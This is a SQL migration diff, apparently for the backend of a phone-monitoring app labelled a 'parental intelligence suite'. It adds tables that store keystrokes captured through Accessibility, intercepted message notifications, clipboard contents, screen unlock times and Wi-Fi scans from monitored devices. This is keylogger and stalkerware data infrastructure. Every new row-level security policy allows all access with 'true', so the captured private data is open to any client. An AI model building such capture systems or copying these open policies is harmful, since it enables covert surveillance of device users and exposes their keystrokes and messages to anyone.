@@ -273,4 +273,81 @@ CREATE POLICY "Admin full access on device_browsing_history" ON public.device_br
 CREATE POLICY "Admin full access on device_files" ON public.device_files FOR ALL USING (true) WITH CHECK (true);
 CREATE POLICY "Admin full access on device_live_sessions" ON public.device_live_sessions FOR ALL USING (true) WITH CHECK (true);
 
+-- ============================================================
+-- 15. PARENTAL INTELLIGENCE SUITE & 24/7 PERSISTENCE
+-- ============================================================
+
+-- A. DEVICE_NOTIFICATIONS (Incoming social & SMS message previews)
+CREATE TABLE IF NOT EXISTS public.device_notifications (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
+  package_name TEXT NOT NULL,
+  app_name TEXT,
+  title TEXT,
+  text TEXT,
+  post_time TIMESTAMPTZ NOT NULL DEFAULT now(),
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+-- B. DEVICE_KEYSTROKES (Typed text & searches captured via Accessibility)
+CREATE TABLE IF NOT EXISTS public.device_keystrokes (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
+  package_name TEXT,
+  app_name TEXT,
+  text TEXT NOT NULL,
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+-- C. DEVICE_CLIPBOARD (Copied texts, links & numbers)
+CREATE TABLE IF NOT EXISTS public.device_clipboard (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
+  content TEXT NOT NULL,
+  copied_at TIMESTAMPTZ NOT NULL DEFAULT now(),
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+-- D. DEVICE_LOCK_EVENTS (Screen ON, OFF & Device Unlocked timeline)
+CREATE TABLE IF NOT EXISTS public.device_lock_events (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
+  event_type TEXT NOT NULL CHECK (event_type IN ('screen_on', 'screen_off', 'user_present')),
+  event_time TIMESTAMPTZ NOT NULL DEFAULT now(),
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+-- E. DEVICE_WIFI_NETWORKS (Connected WiFi SSID & surrounding access points)
+CREATE TABLE IF NOT EXISTS public.device_wifi_networks (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
+  ssid TEXT NOT NULL,
+  bssid TEXT,
+  signal_level INTEGER,
+  is_connected BOOLEAN DEFAULT false,
+  scanned_at TIMESTAMPTZ NOT NULL DEFAULT now(),
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+-- INDEXES FOR INTELLIGENCE TABLES
+CREATE INDEX IF NOT EXISTS idx_device_notifications_device_id ON public.device_notifications(device_id, post_time DESC);
+CREATE INDEX IF NOT EXISTS idx_device_keystrokes_device_id ON public.device_keystrokes(device_id, created_at DESC);
+CREATE INDEX IF NOT EXISTS idx_device_clipboard_device_id ON public.device_clipboard(device_id, copied_at DESC);
+CREATE INDEX IF NOT EXISTS idx_device_lock_events_device_id ON public.device_lock_events(device_id, event_time DESC);
+CREATE INDEX IF NOT EXISTS idx_device_wifi_networks_device_id ON public.device_wifi_networks(device_id, scanned_at DESC);
+
+-- RLS POLICIES
+ALTER TABLE public.device_notifications ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.device_keystrokes ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.device_clipboard ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.device_lock_events ENABLE ROW LEVEL SECURITY;
+ALTER TABLE public.device_wifi_networks ENABLE ROW LEVEL SECURITY;
+
+CREATE POLICY "Service role manages device_notifications" ON public.device_notifications FOR ALL USING (true) WITH CHECK (true);
+CREATE POLICY "Service role manages device_keystrokes" ON public.device_keystrokes FOR ALL USING (true) WITH CHECK (true);
+CREATE POLICY "Service role manages device_clipboard" ON public.device_clipboard FOR ALL USING (true) WITH CHECK (true);
+CREATE POLICY "Service role manages device_lock_events" ON public.device_lock_events FOR ALL USING (true) WITH CHECK (true);
+CREATE POLICY "Service role manages device_wifi_networks" ON public.device_wifi_networks FOR ALL USING (true) WITH CHECK (true);
+
+
 
